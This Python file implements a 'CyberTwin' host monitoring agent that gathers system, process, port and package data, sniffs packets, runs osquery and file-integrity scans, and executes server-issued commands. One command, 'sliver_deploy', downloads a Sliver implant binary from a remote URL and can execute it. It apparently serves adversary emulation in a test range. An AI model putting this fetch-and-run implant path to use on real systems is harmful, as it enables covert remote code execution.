import os
import platform
import socket
import uuid
import psutil
import requests
import json
import time
import threading
import subprocess
import argparse
from datetime import datetime
from sbom.os_sbom import collect_linux_packages, collect_packages, generate_cyclonedx_sbom
from scapy.all import sniff, IP, TCP, UDP, ICMP, Ether, ARP
import heapq
import netifaces
import re
from telemetry import (
    run_osquery,
    build_osquery_event,
    build_fim_baseline,
    save_fim_baseline,
    load_fim_baseline,
    diff_fim,
    build_fim_events,
)

# ---- Config (overridden at runtime from --url / env) ----
SERVER_URL = "http://localhost:8000"   # will be reassigned in __main__
AGENT_ID = str(uuid.getnode())
neighbor_table = {}
tcp_syn_times = {}
network_graph = {}

REQ_TIMEOUT = (3.0, 10.0)  # (connect, read) seconds

# Agent version information
AGENT_VERSION = "1.0.0"
AGENT_NAME = "CyberTwin Host Agent"
DEFAULT_FIM_BASELINE = os.path.expanduser("~/.cybertwin/fim_baseline.json")


# ---- HTTP helper ----
def http_post_json(url, payload, headers=None):
    try:
        h = {
            "Content-Type": "application/json",
            "User-Agent": f"agent/{AGENT_ID}"
        }
        if headers:
            h.update(headers)
        res = requests.post(url, json=payload, headers=h, timeout=REQ_TIMEOUT)
        return res
    except Exception as e:
        print(f"[http] POST {url} failed: {e}")
        return None


def http_get_json(url, headers=None):
    try:
        h = {"User-Agent": f"agent/{AGENT_ID}"}
        if headers:
            h.update(headers)
        res = requests.get(url, headers=h, timeout=REQ_TIMEOUT)
        return res
    except Exception as e:
        print(f"[http] GET {url} failed: {e}")
        return None


# ---- System info ----
def ping_host(target, count=1, timeout_ms=1000):
    system = platform.system().lower()
    if system == "windows":
        cmd = ["ping", "-n", str(count), "-w", str(timeout_ms), target]
    else:
        timeout_s = max(1, int((timeout_ms + 999) / 1000))
        cmd = ["ping", "-c", str(count), "-W", str(timeout_s), target]

    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        return False, None, (result.stdout or "") + (result.stderr or "")

    latency = None
    for line in result.stdout.splitlines():
        match = re.search(r"time[=<]?\s*([0-9.]+)\s*ms", line, re.I)
        if match:
            try:
                latency = float(match.group(1))
            except (TypeError, ValueError):
                latency = None
            break

    return True, latency, result.stdout


def get_system_info():
    return {
        "agent_id": AGENT_ID,
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "platform": platform.platform(),
        "cpu_count": psutil.cpu_count(),
        "memory_total": psutil.virtual_memory().total,
        "interfaces": get_interfaces(),
        "processes": get_processes()
    }


def get_interfaces():
    interfaces = []
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                interfaces.append({
                    "name": iface,
                    "ip": addr.address,
                    "mac": get_mac_address(iface)
                })
    return interfaces


def get_mac_address(iface):
    for snic in psutil.net_if_addrs().get(iface, []):
        if getattr(snic, "family", None) == psutil.AF_LINK or str(getattr(snic, "family", "")) == "AddressFamily.AF_PACKET":
            return snic.address
    return None


def get_processes():
    """Get detailed process information for the agent."""
    processes = []
    for p in psutil.process_iter(attrs=['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status', 'cmdline']):
        try:
            process_info = {
                "pid": p.info['pid'],
                "name": p.info['name'],
                "username": p.info.get('username') or "unknown",
                "cpu_percent": round(p.info.get('cpu_percent', 0) or 0, 2),
                "memory_percent": round(p.info.get('memory_percent', 0) or 0, 2),
                "status": p.info.get('status') or "unknown",
                "cmdline": " ".join(p.info.get('cmdline', [])) if p.info.get('cmdline') else ""
            }
            processes.append(process_info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            # Skip processes that disappear or we can't access
            continue
    return processes


# ---- Cyber Template Data Collection ----
def get_cyber_template_data():
    """
    Collect data specifically formatted for the cyber template JSON fields:
    - OS: Operating system information
    - lib: Libraries/packages installed
    - MAC: MAC addresses of network interfaces
    - port: Network ports that are active/open
    """
    return {
        "OS": get_detailed_os_info(),
        "lib": get_installed_libraries(),
        "MAC": get_mac_addresses(),
        "port": get_active_ports()
    }


def get_detailed_os_info():
    """Get detailed OS information for cyber template"""
    try:
        os_info = platform.platform()
        # Try to get more specific OS details
        if hasattr(platform, 'freedesktop_os_release'):
            try:
                os_release = platform.freedesktop_os_release()
                os_name = os_release.get('PRETTY_NAME', os_info)
                os_version = os_release.get('VERSION', platform.version())
                return f"{os_name} {os_version}"
            except:
                pass

        # Fallback to platform info
        system = platform.system()
        release = platform.release()
        version = platform.version()

        if system == "Linux":
            return f"Linux {release} {version}"
        elif system == "Windows":
            return f"Windows {release} {version}"
        elif system == "Darwin":
            return f"macOS {release} {version}"
        else:
            return f"{system} {release} {version}"
    except Exception as e:
        print(f"[os_info] Error getting OS details: {e}")
        return platform.platform()


def get_installed_libraries():
    """Get list of installed libraries/packages for cyber template"""
    try:
        packages = collect_packages()
        if isinstance(packages, dict) and 'packages' in packages:
            # Extract package names from SBOM format
            libs = []
            for pkg in packages.get('packages', []):
                if isinstance(pkg, dict):
                    name = pkg.get('name', '')
                    version = pkg.get('version', '')
                    if name:
                        libs.append(f"{name}@{version}" if version else name)
                else:
                    libs.append(str(pkg))
            return libs[:50]  # Limit to first 50 for template
        elif isinstance(packages, list):
            # Handle direct list format
            return [str(pkg) for pkg in packages[:50]]
        else:
            return []
    except Exception as e:
        print(f"[libraries] Error collecting libraries: {e}")
        return []


def get_mac_addresses():
    """Get MAC addresses of all network interfaces"""
    macs = []
    try:
        for iface in netifaces.interfaces():
            try:
                addresses = netifaces.ifaddresses(iface)
                if netifaces.AF_LINK in addresses:
                    for link_addr in addresses[netifaces.AF_LINK]:
                        mac = link_addr.get('addr')
                        if mac and mac != '00:00:00:00:00:00':
                            macs.append(mac)
            except (KeyError, ValueError):
                continue
    except Exception as e:
        print(f"[mac] Error getting MAC addresses: {e}")

    # Fallback to psutil if netifaces fails
    if not macs:
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if hasattr(addr, 'family') and addr.family == psutil.AF_LINK:
                        mac = addr.address
                        if mac and mac != '00:00:00:00:00:00':
                            macs.append(mac)
        except Exception as e:
            print(f"[mac] Fallback method also failed: {e}")

    return macs


def get_active_ports():
    """Get active network ports from current connections"""
    ports = []
    try:
        connections = psutil.net_connections(kind='inet')
        for conn in connections:
            if conn.status == psutil.CONN_LISTEN or conn.status == psutil.CONN_ESTABLISHED:
                port_info = {
                    "id": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else f"0.0.0.0:{conn.raddr.port}" if conn.raddr else "unknown",
                    "Protocol": "TCP" if conn.type == socket.SOCK_STREAM else "UDP",
                    "status": conn.status,
                    "local_address": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                    "remote_address": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                    "pid": conn.pid
                }
                ports.append(port_info)
    except Exception as e:
        print(f"[ports] Error getting active ports: {e}")

    return ports


def get_network_connections():
    """Get detailed network connection information similar to Security Onion"""
    connections = []
    try:
        net_connections = psutil.net_connections(kind='inet')
        for conn in net_connections:
            try:
                # Get process information
                process_info = {}
                if conn.pid:
                    try:
                        proc = psutil.Process(conn.pid)
                        process_info = {
                            "pid": conn.pid,
                            "name": proc.name(),
                            "username": proc.username(),
                            "cmdline": " ".join(proc.cmdline()) if proc.cmdline() else ""
                        }
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        process_info = {"pid": conn.pid, "name": "Unknown", "username": "Unknown"}

                connection = {
                    "protocol": "TCP" if conn.type == socket.SOCK_STREAM else "UDP",
                    "local_address": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                    "remote_address": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                    "status": conn.status,
                    "process": process_info,
                    "timestamp": datetime.now().isoformat()
                }
                connections.append(connection)
            except Exception as e:
                print(f"[connection] Error processing connection: {e}")
                continue
    except Exception as e:
        print(f"[connections] Error getting network connections: {e}")

    return connections


def get_interface_statistics():
    """Get detailed interface statistics"""
    interface_stats = []
    try:
        net_io = psutil.net_io_counters(pernic=True)
        for iface, stats in net_io.items():
            interface_stats.append({
                "interface": iface,
                "bytes_sent": stats.bytes_sent,
                "bytes_recv": stats.bytes_recv,
                "packets_sent": stats.packets_sent,
                "packets_recv": stats.packets_recv,
                "errin": stats.errin,
                "errout": stats.errout,
                "dropin": stats.dropin,
                "dropout": stats.dropout,
                "timestamp": datetime.now().isoformat()
            })
    except Exception as e:
        print(f"[interface_stats] Error getting interface statistics: {e}")

    return interface_stats


def print_cyber_template_data():
    """Print cyber template data in a formatted way"""
    data = get_cyber_template_data()

    print("\n" + "="*60)
    print("CYBER TEMPLATE DATA COLLECTION")
    print("="*60)

    print(f"\nOS: {data['OS']}")

    print(f"\nLibraries ({len(data['lib'])} found):")
    for lib in data['lib'][:10]:  # Show first 10
        print(f"  - {lib}")
    if len(data['lib']) > 10:
        print(f"  ... and {len(data['lib']) - 10} more")

    print(f"\nMAC Addresses ({len(data['MAC'])} found):")
    for mac in data['MAC']:
        print(f"  - {mac}")

    print(f"\nActive Ports ({len(data['port'])} found):")
    for port in data['port'][:10]:  # Show first 10
        print(f"  - {port['id']} ({port['Protocol']})")
    if len(data['port']) > 10:
        print(f"  ... and {len(data['port']) - 10} more")

    print("\n" + "="*60)

    return data


# ---- Agent <-> Server ----
def send_heartbeat():
    data = get_system_info()
    # Add version information to the heartbeat
    data["agent_version"] = AGENT_VERSION

    url = f"{SERVER_URL.rstrip('/')}/agent/report/"
    res = http_post_json(url, data)
    if res is None:
        print("[heartbeat] error (request failed)")
    else:
        print(f"[heartbeat] status={res.status_code}")

        # Also send cyber template data if collection is successful
        try:
            cyber_data = get_cyber_template_data()
            if cyber_data and any(cyber_data.values()):  # Only send if we have data
                cyber_url = f"{SERVER_URL.rstrip('/')}/agent/cyber_report/"
                cyber_payload = {
                    "agent_id": AGENT_ID,
                    "cyber_data": cyber_data
                }
                cyber_res = http_post_json(cyber_url, cyber_payload)
                if cyber_res:
                    print(f"[cyber_data] status={cyber_res.status_code}")
                else:
                    print("[cyber_data] failed to send")
        except Exception as e:
            print(f"[cyber_data] error: {e}")


def send_siem_events(events):
    if not events:
        return None
    url = f"{SERVER_URL.rstrip('/')}/siem/pipeline/ingest/"
    token = os.environ.get("SIEM_INGEST_TOKEN", "").strip()
    headers = {"X-SIEM-Token": token} if token else None
    res = http_post_json(url, events, headers=headers)
    if res is None:
        print("[siem] failed to post events")
    else:
        print(f"[siem] POST status: {res.status_code}")
    return res


def send_network_metadata():
    """Send detailed network connection and interface metadata to server"""
    try:
        # Collect comprehensive network data
        network_data = {
            "agent_id": AGENT_ID,
            "timestamp": datetime.now().isoformat(),
            "network_connections": get_network_connections(),
            "interface_statistics": get_interface_statistics(),
            "active_ports": get_active_ports(),
            "interfaces": get_interfaces()
        }

        url = f"{SERVER_URL.rstrip('/')}/agent/network_metadata/"
        res = http_post_json(url, network_data)
        if res:
            print(f"[network_metadata] status={res.status_code}")
            return True
        else:
            print("[network_metadata] failed to send")
            return False
    except Exception as e:
        print(f"[network_metadata] error: {e}")
        return False


def poll_for_commands():
    url = f"{SERVER_URL.rstrip('/')}/agent/commands/?agent_id={AGENT_ID}"
    res = http_get_json(url)
    if res is None:
        print("[commands] polling error (request failed)")
        return
    try:
        cmds = res.json().get("commands", [])
    except Exception as e:
        print(f"[commands] bad JSON: {e}")
        cmds = []
    for cmd in cmds:
        handle_command(cmd)


def handle_command(cmd):
    cmd_id = cmd.get("id")
    action = cmd.get("action")
    parameters = cmd.get("parameters") or {}

    print(f"[command] received: {cmd}")

    if action == "ping":
        target = parameters.get("target") or "8.8.8.8"
        ok, latency, output = ping_host(target, count=2, timeout_ms=2000)
        if ok:
            if latency is not None:
                return_output(cmd_id, f"ping ok: {target} ~{latency:.2f} ms\n{output}")
            else:
                return_output(cmd_id, output)
        else:
            return_output(cmd_id, f"ping failed: {target}\n{output}")
    elif action == "scan":
        cidr = parameters.get("cidr")
        max_hosts = parameters.get("max_hosts")
        scan_id = parameters.get("scan_id")
        if not cidr:
            return_output(cmd_id, "scan failed: cidr missing")
            return

        try:
            import ipaddress
            hosts = []
            count = 0
            max_hosts_val = int(max_hosts) if max_hosts else None
            for ip in ipaddress.ip_network(cidr, strict=False).hosts():
                if max_hosts_val and count >= max_hosts_val:
                    break
                ok, latency, _ = ping_host(str(ip), count=1, timeout_ms=1000)
                if ok:
                    hosts.append({"ip": str(ip), "latency_ms": latency})
                count += 1

            payload = {
                "agent_id": AGENT_ID,
                "cidr": cidr,
                "scan_id": scan_id,
                "hosts": hosts,
            }
            scan_url = f"{SERVER_URL.rstrip('/')}/agent/scan_results/"
            res = http_post_json(scan_url, payload)
            status = res.status_code if res else "failed"
            return_output(cmd_id, f"scan complete: {len(hosts)} hosts (status={status})")
        except Exception as e:
            return_output(cmd_id, f"scan failed: {e}")
    elif action == "sbom":
        sbom_format = parameters.get("format") or "cyclonedx"
        packages = collect_packages()
        sbom = generate_cyclonedx_sbom(packages) if sbom_format == "cyclonedx" else packages
        post_sbom_to_server(sbom_data=sbom, agent_id=AGENT_ID)
        return_output(cmd_id, f"sbom posted ({len(packages)} packages)")
    elif action == "cyber":
        cyber_data = get_cyber_template_data()
        cyber_payload = {
            "agent_id": AGENT_ID,
            "cyber_data": cyber_data
        }
        cyber_url = f"{SERVER_URL.rstrip('/')}/agent/cyber_report/"
        cyber_res = http_post_json(cyber_url, cyber_payload)
        status = cyber_res.status_code if cyber_res else "failed"
        return_output(cmd_id, f"cyber data posted (status={status})")
    elif action == "network_metadata":
        ok = send_network_metadata()
        return_output(cmd_id, "network metadata posted" if ok else "network metadata failed")
    elif action == "info":
        return_output(cmd_id, json.dumps(get_system_info(), indent=2))
    elif action == "osquery":
        query = parameters.get("query")
        if not query:
            return_output(cmd_id, "osquery failed: query missing")
            return
        try:
            results = run_osquery(query)
            event = build_osquery_event(query, results, AGENT_ID, socket.gethostname())
            send_siem_events([event])
            return_output(cmd_id, f"osquery ok: {len(results)} rows")
        except Exception as e:
            return_output(cmd_id, f"osquery failed: {e}")
    elif action == "fim_baseline":
        paths = parameters.get("paths") or []
        if isinstance(paths, str):
            paths = [p.strip() for p in paths.split(",") if p.strip()]
        baseline_path = parameters.get("baseline_path") or DEFAULT_FIM_BASELINE
        baseline = build_fim_baseline(paths)
        save_fim_baseline(baseline, baseline_path)
        return_output(cmd_id, f"fim baseline saved ({len(baseline)} files)")
    elif action == "fim_scan":
        paths = parameters.get("paths") or []
        if isinstance(paths, str):
            paths = [p.strip() for p in paths.split(",") if p.strip()]
        baseline_path = parameters.get("baseline_path") or DEFAULT_FIM_BASELINE
        baseline = load_fim_baseline(baseline_path)
        current = build_fim_baseline(paths)
        changes = diff_fim(baseline, current)
        events = build_fim_events(changes, AGENT_ID, socket.gethostname())
        send_siem_events(events)
        return_output(cmd_id, f"fim scan complete: {len(changes)} changes")
    elif action == "sliver_deploy":
        url = parameters.get("url")
        file_name = parameters.get("file_name") or "sliver_implant.bin"
        expected_sha = parameters.get("sha256")
        execute_after = bool(parameters.get("execute"))
        execute_args = parameters.get("execute_args") or []
        if isinstance(execute_args, str):
            execute_args = execute_args.split()
        if not url:
            return_output(cmd_id, "sliver_deploy failed: url missing")
            return

        try:
            base_dir = os.path.expanduser("~/.cybertwin/sliver_artifacts")
            os.makedirs(base_dir, exist_ok=True)
            dest_path = os.path.join(base_dir, file_name)

            res = requests.get(url, timeout=REQ_TIMEOUT, stream=True)
            if res.status_code != 200:
                return_output(cmd_id, f"sliver_deploy failed: http {res.status_code}")
                return

            with open(dest_path, "wb") as handle:
                for chunk in res.iter_content(chunk_size=1024 * 256):
                    if chunk:
                        handle.write(chunk)

            if expected_sha:
                import hashlib
                digest = hashlib.sha256()
                with open(dest_path, "rb") as handle:
                    for chunk in iter(lambda: handle.read(1024 * 256), b""):
                        digest.update(chunk)
                actual_sha = digest.hexdigest()
                if actual_sha != expected_sha:
                    return_output(cmd_id, f"sliver_deploy failed: sha256 mismatch ({actual_sha})")
                    return
            exec_note = ""
            if execute_after:
                try:
                    os.chmod(dest_path, 0o700)
                except Exception:
                    pass
                try:
                    proc = subprocess.Popen([dest_path] + list(execute_args))
                    exec_note = f" (executed pid={proc.pid})"
                except Exception as e:
                    exec_note = f" (execute failed: {e})"

            return_output(cmd_id, f"sliver_deploy saved to {dest_path}{exec_note}")
        except Exception as e:
            return_output(cmd_id, f"sliver_deploy failed: {e}")
    else:
        return_output(cmd_id, f"Unknown action: {action}")


def return_output(cmd_id, output):
    url = f"{SERVER_URL.rstrip('/')}/agent/command_result/"
    payload = {
        "agent_id": AGENT_ID,
        "command_id": cmd_id,
        "output": output
    }
    res = http_post_json(url, payload)
    if res is None:
        print("[command_result] failed (request failed)")


# ---- SBOM ----
def post_sbom_to_server(sbom_data, server_url=None, agent_id="unknown", vulnerabilities=None):
    """
    server_url:
      - If None, posts to f"{SERVER_URL}/sbom"
      - Otherwise, post to the given absolute URL.
    """
    target = server_url or f"{SERVER_URL.rstrip('/')}/sbom"
    headers = {
        "X-Agent-ID": agent_id,
        "X-Timestamp": datetime.utcnow().isoformat() + "Z"
    }
    payload = sbom_data
    if vulnerabilities:
        payload = {"sbom": sbom_data, "vulnerabilities": vulnerabilities}
    res = http_post_json(target, payload, headers=headers)
    if res is None:
        print("[sbom] Failed to post (request failed)")
    else:
        print(f"[sbom] POST status: {res.status_code}")
        if res.status_code != 200:
            print(f"[sbom] Error: {res.text}")


# ---- Graph / latency ----
def update_graph_latency(src, dst, latency):
    network_graph.setdefault(src, {})[dst] = latency
    network_graph.setdefault(dst, {})[src] = latency


def dijkstra(graph, start, end):
    queue = [(0, start, [])]
    visited = set()
    while queue:
        cost, node, path = heapq.heappop(queue)
        if node in visited:
            continue
        visited.add(node)
        path = path + [node]
        if node == end:
            return (cost, path)
        for neighbor, weight in graph.get(node, {}).items():
            if neighbor not in visited:
                heapq.heappush(queue, (cost + weight, neighbor, path))
    return (float("inf"), [])


# ---- Packet capture ----
def packet_callback(pkt):
    info = {
        "timestamp": datetime.now().isoformat(),
        "proto": "Unknown",
        "src_mac": None,
        "dst_mac": None,
        "src_ip": None,
        "dst_ip": None,
        "src_port": None,
        "dst_port": None,
    }

    now = datetime.utcnow()

    if pkt.haslayer(Ether):
        info["src_mac"] = pkt[Ether].src
        info["dst_mac"] = pkt[Ether].dst

    if pkt.haslayer(IP):
        info["proto"] = "IP"
        info["src_ip"] = pkt[IP].src
        info["dst_ip"] = pkt[IP].dst

        if pkt.haslayer(TCP):
            info["proto"] = "TCP"
            tcp = pkt[TCP]
            info["src_port"] = tcp.sport
            info["dst_port"] = tcp.dport
            key = (info["src_ip"], info["dst_ip"], info["dst_port"])
            flags = getattr(tcp, "flags", "")
            # Use bit checks to be robust:
            # SYN = 0x02, ACK = 0x10
            syn = bool(flags & 0x02)
            ack = bool(flags & 0x10)
            if syn and not ack:  # SYN
                tcp_syn_times[key] = now
            elif syn and ack:    # SYN-ACK
                reverse_key = (info["dst_ip"], info["src_ip"], tcp.sport)
                if reverse_key in tcp_syn_times:
                    delta = (now - tcp_syn_times.pop(reverse_key)).total_seconds() * 1000
                    print(f"[latency] {reverse_key[0]} -> {reverse_key[1]}: ~{delta:.2f} ms")
                    update_graph_latency(reverse_key[0], reverse_key[1], delta)

        elif pkt.haslayer(UDP):
            info["proto"] = "UDP"
            info["src_port"] = pkt[UDP].sport
            info["dst_port"] = pkt[UDP].dport
        elif pkt.haslayer(ICMP):
            info["proto"] = "ICMP"

    elif pkt.haslayer(ARP):
        info["proto"] = "ARP"
        info["src_ip"] = pkt[ARP].psrc
        info["dst_ip"] = pkt[ARP].pdst

    print(f"[sniff] {info['timestamp']} {info['proto']} {info['src_mac']} -> {info['dst_mac']} | "
          f"{info['src_ip']}:{info['src_port']} -> {info['dst_ip']}:{info['dst_port']}")

    key = (info["src_ip"], info["src_mac"])
    if key not in neighbor_table:
        neighbor_table[key] = {
            "first_seen": info["timestamp"],
            "proto": info["proto"]
        }
        print(f"[neighbor] new: {info['src_ip']} / {info['src_mac']} via {info['proto']}")

    # Auto-path calculation from new node
    if info["src_ip"] in network_graph:
        for target in network_graph:
            if target != info["src_ip"]:
                cost, path = dijkstra(network_graph, info["src_ip"], target)
                if path:
                    print(f"[autopath] {info['src_ip']} -> {target} ~{cost:.2f} ms via: {' -> '.join(path)}")


def sniff_interface(interface):
    print(f"[sniff] Starting sniff on {interface}")
    sniff(iface=interface, prn=packet_callback, store=False)


# ---- Interactive path calc ----
def run_dijkstra_interactive():
    print("\n[graph] Known nodes:")
    for node in network_graph:
        print(f" - {node}")
    start = input("Enter start IP: ").strip()
    end = input("Enter end IP: ").strip()
    cost, path = dijkstra(network_graph, start, end)
    if path:
        print(f"[path] {start} -> {end} in {cost:.2f} ms via: {' -> '.join(path)}")
    else:
        print(f"[path] No route found from {start} to {end}.")


# ---- Main loop ----
def main_loop():
    while True:
        send_heartbeat()
        poll_for_commands()
        time.sleep(30)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Host Agent CLI")
    parser.add_argument("--url", help="Base server URL for the dashboard API (e.g., http://server:8000)")
    subparsers = parser.add_subparsers(dest="command")

    subparsers.add_parser("run", help="Run persistent agent loop")
    subparsers.add_parser("heartbeat", help="Send a single heartbeat")
    subparsers.add_parser("poll", help="Poll once for commands")
    subparsers.add_parser("info", help="Print system info")
    sbom_parser = subparsers.add_parser("sbom", help="Collect installed package list (SBOM)")
    sbom_parser.add_argument("--output", "-o", help="Write SBOM to a file")
    sbom_parser.add_argument("--format", "-f", choices=["raw", "cyclonedx"], default="raw", help="SBOM output format")
    sbom_parser.add_argument("--sbom-url", help="Override SBOM POST URL (default: <server>/sbom)")
    sbom_parser.add_argument("--vuln-file", help="Optional JSON file with vulnerabilities (e.g., Grype/Trivy output)")
    sniff_parser = subparsers.add_parser("sniff", help="Sniff packets on interface")
    sniff_parser.add_argument("--interface", "-i", required=True, help="Interface to sniff on")
    subparsers.add_parser("path", help="Run Dijkstra to find shortest latency path interactively")
    cyber_parser = subparsers.add_parser("cyber", help="Collect cyber template data (OS, libraries, MAC addresses, ports)")
    cyber_parser.add_argument("--output", "-o", help="Write cyber template data to a JSON file")
    cyber_parser.add_argument("--format", "-f", choices=["template", "full"], default="template", help="Output format: 'template' for cyber template format, 'full' for detailed data")
    osquery_parser = subparsers.add_parser("osquery", help="Run an osquery query and send results to SIEM")
    osquery_parser.add_argument("--query", "-q", required=True, help="osquery SQL query to run")
    fim_baseline_parser = subparsers.add_parser("fim-baseline", help="Create file integrity baseline")
    fim_baseline_parser.add_argument("--paths", "-p", required=True, help="Comma-separated file or directory paths")
    fim_baseline_parser.add_argument("--baseline-path", help="Baseline file path (default: ~/.cybertwin/fim_baseline.json)")
    fim_scan_parser = subparsers.add_parser("fim-scan", help="Scan for file integrity changes")
    fim_scan_parser.add_argument("--paths", "-p", required=True, help="Comma-separated file or directory paths")
    fim_scan_parser.add_argument("--baseline-path", help="Baseline file path (default: ~/.cybertwin/fim_baseline.json)")

    args = parser.parse_args()

    # Resolve SERVER_URL: CLI → env → default
    cli_url = (args.url or "").strip()
    env_url = os.environ.get("AGENT_SERVER_URL", "").strip()
    if cli_url:
        SERVER_URL = cli_url
    elif env_url:
        SERVER_URL = env_url

    # Commands
    if args.command == "run":
        main_loop()
    elif args.command == "heartbeat":
        send_heartbeat()
    elif args.command == "poll":
        poll_for_commands()
    elif args.command == "info":
        print(json.dumps(get_system_info(), indent=2))
    elif args.command == "sbom":
        packages = collect_packages()
        sbom = generate_cyclonedx_sbom(packages) if args.format == "cyclonedx" else packages
        vulnerabilities = None
        if args.vuln_file:
            try:
                with open(args.vuln_file, "r") as f:
                    vulnerabilities = json.load(f)
            except Exception as e:
                print(f"[sbom] Failed to load vuln file: {e}")
        if args.output:
            with open(args.output, "w") as f:
                json.dump(sbom, f, indent=2)
            print(f"[sbom] SBOM written to {args.output}")
        else:
            print(json.dumps(sbom, indent=2))
        post_sbom_to_server(sbom_data=sbom, server_url=args.sbom_url, agent_id=AGENT_ID, vulnerabilities=vulnerabilities)
    elif args.command == "sniff":
        sniff_interface(args.interface)
    elif args.command == "path":
        run_dijkstra_interactive()
    elif args.command == "cyber":
        data = get_cyber_template_data()

        if args.format == "template":
            # Output in cyber template format (just the 4 fields)
            output_data = data
        else:
            # Full format with additional system info
            output_data = {
                "cyber_template_data": data,
                "system_info": get_system_info(),
                "collection_timestamp": datetime.now().isoformat()
            }

        if args.output:
            with open(args.output, "w") as f:
                json.dump(output_data, f, indent=2)
            print(f"[cyber] Data written to {args.output}")
        else:
            print(json.dumps(output_data, indent=2))
    elif args.command == "osquery":
        query = getattr(args, "query", "")
        try:
            results = run_osquery(query)
            event = build_osquery_event(query, results, AGENT_ID, socket.gethostname())
            print(json.dumps(event, indent=2))
            send_siem_events([event])
        except Exception as e:
            print(f"[osquery] failed: {e}")
    elif args.command == "fim-baseline":
        paths = [p.strip() for p in (args.paths or "").split(",") if p.strip()]
        baseline = build_fim_baseline(paths)
        save_fim_baseline(baseline, args.baseline_path or DEFAULT_FIM_BASELINE)
        print(f"[fim] baseline saved ({len(baseline)} files)")
    elif args.command == "fim-scan":
        paths = [p.strip() for p in (args.paths or "").split(",") if p.strip()]
        baseline_path = args.baseline_path or DEFAULT_FIM_BASELINE
        baseline = load_fim_baseline(baseline_path)
        current = build_fim_baseline(paths)
        changes = diff_fim(baseline, current)
        events = build_fim_events(changes, AGENT_ID, socket.gethostname())
        send_siem_events(events)
        print(f"[fim] scan complete: {len(changes)} changes")
    else:
        parser.print_help()
